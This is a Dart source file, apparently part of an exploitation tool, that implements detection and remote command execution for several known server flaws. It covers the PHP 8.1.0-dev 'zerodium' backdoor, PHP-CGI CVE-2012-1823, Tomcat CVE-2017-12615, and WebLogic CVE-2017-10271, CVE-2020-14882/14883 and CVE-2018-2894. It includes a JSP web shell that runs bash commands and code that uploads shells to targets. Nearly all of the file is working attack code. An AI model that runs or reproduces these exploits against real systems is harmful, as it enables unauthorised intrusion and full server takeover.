import 'dart:io';

import 'package:http/http.dart' as http;

import 'exp_result.dart';
import 'rce_encoder.dart';

class PhpBackdoorExpService {
  final String baseUrl;
  final String phpPath;
  final Duration timeout;

  PhpBackdoorExpService({
    required this.baseUrl,
    this.phpPath = '/index.php',
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      final res = await http.get(
        Uri.parse('$_base$phpPath'),
        headers: {'User-Agentt': 'zerodiumsystem("echo PHP_BACKDOOR_54289");'},
      ).timeout(timeout);
      if (res.body.contains('PHP_BACKDOOR_54289')) {
        return ExpResult(true, 'PHP 8.1.0-dev 后门', 'User-Agentt 后门存在，回显验证通过');
      }
    } catch (_) {}
    return const ExpResult(false, 'PHP 8.1.0-dev 后门', '');
  }

  static const _sentinel = 'PHP_RCE_OUT';

  static String? _extract(String body) {
    const s = '${_sentinel}_S';
    const e = '${_sentinel}_E';
    final start = body.indexOf(s);
    final end = body.indexOf(e);
    if (start == -1 || end == -1 || end <= start) return null;
    return body.substring(start + s.length, end).trim();
  }

  Future<String?> execRce(String cmd) async {
    try {
      final escaped = cmd.replaceAll('"', r'\"');
      final res = await http.get(
        Uri.parse('$_base$phpPath'),
        headers: {
          'User-Agentt':
              "zerodiumecho '${_sentinel}_S';system(\"$escaped\");echo '${_sentinel}_E';",
        },
      ).timeout(timeout);
      if (res.body.isEmpty) return null;
      return _extract(res.body) ?? res.body;
    } catch (_) {
      return null;
    }
  }
}

class PhpCgiExpService {
  final String baseUrl;
  final String phpPath;
  final Duration timeout;

  PhpCgiExpService({
    required this.baseUrl,
    this.phpPath = '/index.php',
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      final url =
          '$_base$phpPath?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input';
      final res = await http
          .post(
            Uri.parse(url),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: '<?php echo "PHP_CGI_54289"; ?>',
          )
          .timeout(timeout);
      if (res.body.contains('PHP_CGI_54289')) {
        return ExpResult(
          true,
          'CVE-2012-1823 (PHP-CGI)',
          'PHP-CGI 参数注入代码执行验证通过',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2012-1823 (PHP-CGI)', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final url =
          '$_base$phpPath?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input';
      final escaped = RceEncoder.escapeDoubleQuoted(cmd);
      const begin = 'MATRIX_CGI_BEGIN';
      const end = 'MATRIX_CGI_END';
      final res = await http
          .post(
            Uri.parse(url),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: '<?php echo "$begin"; echo shell_exec("$escaped"); echo "$end"; ?>',
          )
          .timeout(timeout);
      final body = res.body;
      final s = body.indexOf(begin);
      final e = body.indexOf(end);
      if (s != -1 && e != -1 && e > s) {
        final extracted = body.substring(s + begin.length, e).trim();
        return extracted.isNotEmpty ? extracted : null;
      }
      return body.isNotEmpty ? body : null;
    } catch (_) {
      return null;
    }
  }
}

class TomcatExpService {
  final String baseUrl;
  final Duration timeout;

  TomcatExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  static const _shellName = 'mAtrix_t_shell';
  static const _shellContent =
      '<%@ page import="java.util.*,java.io.*"%><%if(request.getParameter("cmd")!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",request.getParameter("cmd")});BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));StringBuilder sb=new StringBuilder();String line;while((line=br.readLine())!=null)sb.append(line).append("\\n");out.print(sb);}%>';

  Future<ExpResult> check() async {
    try {
      const probeJsp = '<% out.print("TOMCAT_JSP_54289"); %>';
      final putJspRes = await http
          .put(
            Uri.parse('$_base/tomcat_check_54289.jsp/'),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: probeJsp,
          )
          .timeout(timeout);
      if (putJspRes.statusCode == 201 || putJspRes.statusCode == 204) {
        final jspGetRes =
            await http.get(Uri.parse('$_base/tomcat_check_54289.jsp')).timeout(timeout);
        if (jspGetRes.body.contains('TOMCAT_JSP_54289')) {
          return ExpResult(
            true,
            'CVE-2017-12615',
            'PUT 写入 JSP 并成功执行回显，RCE 链路成立',
          );
        }
      }

      final putRes = await http
          .put(
            Uri.parse('$_base/tomcat_put_test.txt/'),
            headers: {'Content-Type': 'text/plain'},
            body: 'tomcat_put_54289',
          )
          .timeout(timeout);
      if (putRes.statusCode == 201 || putRes.statusCode == 204) {
        final getRes =
            await http.get(Uri.parse('$_base/tomcat_put_test.txt')).timeout(timeout);
        if (getRes.body.contains('tomcat_put_54289')) {
          return ExpResult(true, 'CVE-2017-12615', 'PUT 方法开启，文件写入并读取验证成功');
        }
        return ExpResult(
          true,
          'CVE-2017-12615',
          'PUT 方法开启 (状态 ${putRes.statusCode})',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2017-12615', '');
  }

  Future<String?> getShell() async {
    try {
      final putRes = await http
          .put(
            Uri.parse('$_base/$_shellName.jsp/'),
            headers: {'Content-Type': 'application/octet-stream'},
            body: _shellContent,
          )
          .timeout(timeout);
      if (putRes.statusCode == 201 || putRes.statusCode == 204) {
        return '$_base/$_shellName.jsp';
      }
    } catch (_) {}
    return null;
  }

  Future<String?> execRce(String cmd) async {
    try {
      await http
          .put(
            Uri.parse('$_base/$_shellName.jsp/'),
            headers: {'Content-Type': 'application/octet-stream'},
            body: _shellContent,
          )
          .timeout(timeout);
      await Future<void>.delayed(const Duration(milliseconds: 300));
      final res = await http
          .get(Uri.parse('$_base/$_shellName.jsp?cmd=${Uri.encodeComponent(cmd)}'))
          .timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }
}

class WebLogicExpService {
  final String baseUrl;
  final Duration timeout;

  WebLogicExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  String _xmlDecoderPayload(String cmd) {
    final safe = RceEncoder.xmlEscape(cmd);
    return '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
  <array class="java.lang.String" length="3">
    <void index="0"><string>/bin/bash</string></void>
    <void index="1"><string>-c</string></void>
    <void index="2"><string>$safe</string></void>
  </array>
  <void method="start"/>
</void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>''';
  }

  Future<ExpResult> checkCve201710271() async {
    try {
      final res = await http
          .post(
            Uri.parse('$_base/wls-wsat/CoordinatorPortType'),
            headers: {'Content-Type': 'text/xml'},
            body: _xmlDecoderPayload('id'),
          )
          .timeout(timeout);
      if (res.statusCode == 200 || res.statusCode == 500) {
        return ExpResult(
          true,
          'CVE-2017-10271',
          'WebLogic XMLDecoder 端点存在 (${res.statusCode})',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2017-10271', '');
  }

  Future<String?> execRceCve201710271(String cmd) async {
    try {
      final res = await http
          .post(
            Uri.parse('$_base/wls-wsat/CoordinatorPortType'),
            headers: {'Content-Type': 'text/xml'},
            body: _xmlDecoderPayload(cmd),
          )
          .timeout(timeout);
      return res.body.isNotEmpty ? res.body : '命令已发送 (状态 ${res.statusCode})，无直接回显';
    } catch (_) {
      return null;
    }
  }

  Future<ExpResult> checkCve202014882() async {
    // Must NOT follow redirects: the bypass returns 302 → console.portal.
    // If we follow, the redirect target may 404 and we'd miss the detection.
    // A Location header containing 'console.portal' confirms the server decoded
    // %252e%252e%252f → %2e%2e%2f and routed it as a path-traversal bypass.
    final client = HttpClient()
      ..badCertificateCallback = (_, __, _) => true;
    try {
      final uri = Uri.parse('$_base/console/css/%252e%252e%252fconsole.portal');
      final req = await client.getUrl(uri).timeout(timeout);
      req.followRedirects = false;
      final res = await req.close().timeout(timeout);
      final location = res.headers.value('location') ?? '';
      if ((res.statusCode == 302 || res.statusCode == 200) &&
          location.contains('console.portal')) {
        return ExpResult(
          true,
          'CVE-2020-14882/14883',
          '控制台路径绕过成功，Location: $location',
        );
      }
    } catch (_) {
    } finally {
      client.close();
    }
    return const ExpResult(false, 'CVE-2020-14882/14883', '');
  }

  Future<String?> execRceCve202014882(String cmd) async {
    // ShellSession uses getRuntime().exec(String[]) under the hood — shell
    // redirects (>&, |, etc.) don't work unless wrapped with sh -c.
    // Response body is always the console HTML page; command output goes to
    // the server-side process only, so we never show the body.
    try {
      final safeCmd = cmd.replaceAll(r'\', r'\\').replaceAll("'", r"\'");
      final groovyCmd =
          "java.lang.Runtime.getRuntime().exec(new String[]{'/bin/sh','-c','$safeCmd'});";
      final handle = Uri.encodeQueryComponent(
        'com.tangosol.coherence.mvel2.sh.ShellSession("$groovyCmd")',
      );
      final url =
          '$_base/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=$handle';
      final res = await http.get(Uri.parse(url)).timeout(timeout);
      if (res.statusCode == 200 || res.statusCode == 302) {
        return '命令已发送 (状态 ${res.statusCode})，ShellSession 无直接回显';
      }
      return null;
    } catch (_) {
      return null;
    }
  }

  // ── CVE-2018-2894 — Web Service 测试页文件上传 GetShell ──────────────────
  // 影响：WebLogic 12.2.1.3（/ws_utc 测试客户端开启时）
  // 流程：
  //   1. POST /ws_utc/begin.do 修改 currentWorkDir 为 Web 可访问目录（css 子目录）
  //   2. 多部分上传 JSP Webshell 到 /ws_utc/resources/setting/OPTIONS/<class>
  //   3. Shell 路径 /ws_utc/css/{timestamp}.jsp
  //
  // Bug 预防：
  //   1. timestamp 用毫秒级时间戳同时作为 setting-id 和文件名，保证唯一且可预测。
  //   2. 上传后等待 300ms 再验证 Shell，避免服务器写入延迟导致 404 误判。
  //   3. workDir 依赖安装路径，做成参数由用户传入；默认值为 vulhub 环境路径。
  //   4. 检测只检查 /ws_utc/config.do 是否返回 200，不上传文件，安全无副作用。
  static const _wsUtcDefaultWorkDir =
      '/u01/oracle/user_projects/domains/base_domain/servers/AdminServer'
      '/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls'
      '/4mcj4y/war/css';

  Future<ExpResult> checkCve20182894() async {
    try {
      final res = await http
          .get(Uri.parse('$_base/ws_utc/config.do'))
          .timeout(timeout);
      if (res.statusCode == 200 &&
          (res.body.contains('ws_utc') || res.body.contains('WebService'))) {
        return ExpResult(
          true,
          'CVE-2018-2894',
          'Web Service 测试客户端可访问 (HTTP ${res.statusCode})',
        );
      }
      if (res.statusCode == 200) {
        return ExpResult(
          true,
          'CVE-2018-2894',
          '/ws_utc/config.do 可访问 (HTTP 200)，疑似存在漏洞',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2018-2894', '');
  }

  Future<String?> getShellCve20182894(
    String shellContent, {
    String workDir = _wsUtcDefaultWorkDir,
  }) async {
    try {
      // Step 1: 修改 Work Home Dir 为 Web 可访问 css 子目录
      await http
          .post(
            Uri.parse('$_base/ws_utc/begin.do'),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'currentWorkDir=${Uri.encodeQueryComponent(workDir)}',
          )
          .timeout(timeout);

      // Step 2: 上传 JSP Shell（多部分）
      final timestamp = DateTime.now().millisecondsSinceEpoch;
      final uploadUri = Uri.parse(
        '$_base/ws_utc/resources/setting/OPTIONS/'
        'com.bea.core.repackaged.springframework.context.support'
        '.FileSystemXmlApplicationContext',
      );
      final req = http.MultipartRequest('POST', uploadUri)
        ..fields['setting-id'] = timestamp.toString()
        ..fields['wsdl-url']   = ''
        ..files.add(http.MultipartFile.fromString(
          'uploadedFile',
          shellContent,
          filename: '$timestamp.jsp',
        ));
      await req.send().timeout(timeout);

      // Step 3: 等待写入后验证 Shell 路径
      await Future<void>.delayed(const Duration(milliseconds: 300));
      final shellUrl = '$_base/ws_utc/css/$timestamp.jsp';
      final check = await http.get(Uri.parse(shellUrl)).timeout(timeout);
      if (check.statusCode == 200) return shellUrl;
      return null;
    } catch (_) {
      return null;
    }
  }
}
